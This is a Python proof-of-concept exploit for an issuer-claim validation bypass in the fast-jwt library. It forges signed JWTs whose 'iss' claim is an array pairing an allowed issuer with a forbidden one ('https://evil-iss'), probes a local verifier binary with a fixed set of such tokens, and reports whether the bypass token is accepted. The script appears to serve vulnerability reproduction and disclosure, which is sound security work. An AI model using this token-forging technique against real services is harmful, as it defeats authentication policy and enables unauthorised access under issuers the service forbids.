#!/usr/bin/env python3
"""PoC: fast-jwt iss claim array-form validation bypass.

Drives a JWT-verification target binary (Node.js SEA embedding fast-jwt with
createVerifier({ key, allowedIss: [...] })). The target's claim check accepts
the validated claim in array form and only requires that SOME element matches
an allowed value. A token carrying iss = [allowed, disallowed] is therefore
accepted even though it asserts an issuer the policy forbids. RFC 7519 defines
"iss" as a single StringOrURI, so a strict verifier rejects the array form.

The script is a pure construct-and-report tool: it probes the binary with a
small bounded set of signed tokens, deterministically selects the trigger
token from the discovery results, performs one final verification run, and
reports the binary's own verdict JSON exactly. A rejection is a legitimate
outcome and is reported, never treated as a script failure.
"""

import argparse
import base64
import hashlib
import hmac
import json
import re
import signal
import subprocess
import sys
import time

# Secret is generated in-script at runtime (fixed literal => deterministic
# across repeated runs; nothing is read from disk or the environment).
SECRET = "poc-hs256-runtime-secret-9f2c71"

# Fallback allowed-issuer used only if static extraction from the binary
# fails; the primary source is the verifier configuration embedded in the
# target binary itself.
FALLBACK_ALLOWED_ISS = "https://valid-iss"

DISALLOWED_ISS = "https://evil-iss"

FIXED_IAT = 1700000000
FIXED_SUB = "poc"


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def sign_jwt(payload: dict, secret: str) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    head = b64url(json.dumps(header, separators=(",", ":")).encode())
    body = b64url(json.dumps(payload, separators=(",", ":")).encode())
    sig = b64url(hmac.new(secret.encode(), f"{head}.{body}".encode(),
                          hashlib.sha256).digest())
    return f"{head}.{body}.{sig}"


def run_binary(binary: str, token: str, secret: str, timeout: float):
    """Run the target once. Returns a dict with execution facts; never raises
    for token rejection. Raises only for script-level execution failures."""
    argv = [binary, "--token", token, "--key", secret]
    start = time.monotonic()
    try:
        proc = subprocess.run(argv, capture_output=True, text=True,
                              timeout=timeout)
    except subprocess.TimeoutExpired as exc:
        return {
            "argv": argv,
            "returncode": None,
            "signal": None,
            "timed_out": True,
            "runtime_ms": int((time.monotonic() - start) * 1000),
            "stdout": (exc.stdout or "") if isinstance(exc.stdout, str) else "",
            "stderr": (exc.stderr or "") if isinstance(exc.stderr, str) else "",
            "result": None,
            "exec_error": f"process timed out after {timeout} seconds",
        }
    except OSError as exc:
        return {
            "argv": argv,
            "returncode": None,
            "signal": None,
            "timed_out": False,
            "runtime_ms": int((time.monotonic() - start) * 1000),
            "stdout": "",
            "stderr": "",
            "result": None,
            "exec_error": f"could not start binary: {exc}",
        }

    elapsed = int((time.monotonic() - start) * 1000)
    sig = None
    if proc.returncode is not None and proc.returncode < 0:
        try:
            sig = signal.Signals(-proc.returncode).name
        except ValueError:
            sig = f"SIG{-proc.returncode}"

    result = None
    exec_error = None
    for line in proc.stdout.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            parsed = json.loads(line)
        except json.JSONDecodeError:
            continue
        if isinstance(parsed, dict) and "ok" in parsed:
            result = parsed
            break
    if result is None:
        exec_error = "binary emitted no parseable verification result JSON"

    return {
        "argv": argv,
        "returncode": proc.returncode,
        "signal": sig,
        "timed_out": False,
        "runtime_ms": elapsed,
        "stdout": proc.stdout,
        "stderr": proc.stderr,
        "result": result,
        "exec_error": exec_error,
    }


def extract_allowed_issuers(binary: str):
    """Statically pull the allowedIss list out of the verifier configuration
    embedded in the target binary. Falls back to a single default issuer."""
    pattern = re.compile(rb'allowedIss\s*:\s*\[((?:\s*"[^"]*"\s*,?)*)')
    found = []
    try:
        with open(binary, "rb") as fh:
            while True:
                chunk = fh.read(8 * 1024 * 1024)
                if not chunk:
                    break
                for match in pattern.finditer(chunk):
                    for sm in re.finditer(rb'"([^"]+)"', match.group(1)):
                        value = sm.group(1).decode("utf-8", "replace")
                        if value and value not in found:
                            found.append(value)
    except OSError:
        pass
    return found or [FALLBACK_ALLOWED_ISS]


def truncate(text: str, limit: int = 8192) -> str:
    if len(text) <= limit:
        return text
    return text[:limit] + f"...<truncated {len(text) - limit} chars>"


def main() -> int:
    parser = argparse.ArgumentParser(
        description="PoC: fast-jwt iss array-form claim-validation bypass")
    parser.add_argument("--binary", required=True,
                        help="path to the jwt-verify target binary")
    parser.add_argument("--json-out", default=None,
                        help="write the JSON result to this file instead of stdout")
    parser.add_argument("--timeout", type=float, default=30,
                        help="per-run timeout in seconds (default 30)")
    args = parser.parse_args()

    allowed_issuers = extract_allowed_issuers(args.binary)
    good_iss = allowed_issuers[0]
    evil_iss = DISALLOWED_ISS
    if evil_iss in allowed_issuers:
        evil_iss = evil_iss + "/attacker"

    # ---- Bounded discovery probes (fixed set, deterministic order) --------
    probes = [
        ("baseline_good_string", {"iss": good_iss, "sub": FIXED_SUB, "iat": FIXED_IAT}),
        ("disallowed_string", {"iss": evil_iss, "sub": FIXED_SUB, "iat": FIXED_IAT}),
        ("control_unknown_claim", {"iss": good_iss, "poc_probe": "x",
                                   "sub": FIXED_SUB, "iat": FIXED_IAT}),
        ("array_only_allowed", {"iss": [good_iss], "sub": FIXED_SUB, "iat": FIXED_IAT}),
        ("array_only_disallowed", {"iss": [evil_iss], "sub": FIXED_SUB, "iat": FIXED_IAT}),
        ("array_allowed_then_disallowed",
         {"iss": [good_iss, evil_iss], "sub": FIXED_SUB, "iat": FIXED_IAT}),
        ("array_disallowed_then_allowed",
         {"iss": [evil_iss, good_iss], "sub": FIXED_SUB, "iat": FIXED_IAT}),
    ]
    probe_outcomes = {}
    for name, payload in probes:
        run = run_binary(args.binary, sign_jwt(payload, SECRET), SECRET,
                         args.timeout)
        accepted = bool(run["result"] and run["result"].get("ok") is True)
        probe_outcomes[name] = {
            "accepted": accepted,
            "result": run["result"],
            "exec_error": run["exec_error"],
        }

    # ---- Deterministic trigger selection ----------------------------------
    # Prefer an accepted array form that carries a disallowed issuer next to
    # an allowed one (the form a strict RFC 7519 verifier rejects, since iss
    # is a single StringOrURI and the policy forbids the extra value).
    # Selection depends only on discovery probes, never on the final run.
    candidates = [
        ("array_allowed_then_disallowed", [good_iss, evil_iss]),
        ("array_disallowed_then_allowed", [evil_iss, good_iss]),
    ]
    chosen_iss = None
    for probe_name, iss_value in candidates:
        if probe_outcomes.get(probe_name, {}).get("accepted"):
            chosen_iss = iss_value
            break
    if chosen_iss is None:
        # No candidate accepted during discovery (e.g. a fixed build that
        # rejects the array form): still use the primary candidate so the
        # final run exercises the same claim-validation path.
        chosen_iss = candidates[0][1]

    final_payload = {"iss": chosen_iss, "sub": FIXED_SUB, "iat": FIXED_IAT}
    final_token = sign_jwt(final_payload, SECRET)

    # ---- Single final verification run, reported verbatim -----------------
    final = run_binary(args.binary, final_token, SECRET, args.timeout)

    observable_value = None
    error = final["exec_error"]
    if final["result"] is not None:
        observable_value = json.dumps(final["result"], separators=(",", ":"))
        error = None

    report = {
        "binary": args.binary,
        "command": final["argv"],
        "returncode": final["returncode"],
        "signal": final["signal"],
        "timed_out": final["timed_out"],
        "runtime_ms": final["runtime_ms"],
        "stdout": truncate(final["stdout"]),
        "stderr": truncate(final["stderr"]),
        "observable": {
            "kind": "stdout",
            "value": observable_value,
            "path": None,
        },
        "error": error,
    }

    serialized = json.dumps(report, indent=2)
    if args.json_out:
        with open(args.json_out, "w", encoding="utf-8") as fh:
            fh.write(serialized + "\n")
    else:
        print(serialized)

    return 0 if error is None else 1


if __name__ == "__main__":
    sys.exit(main())
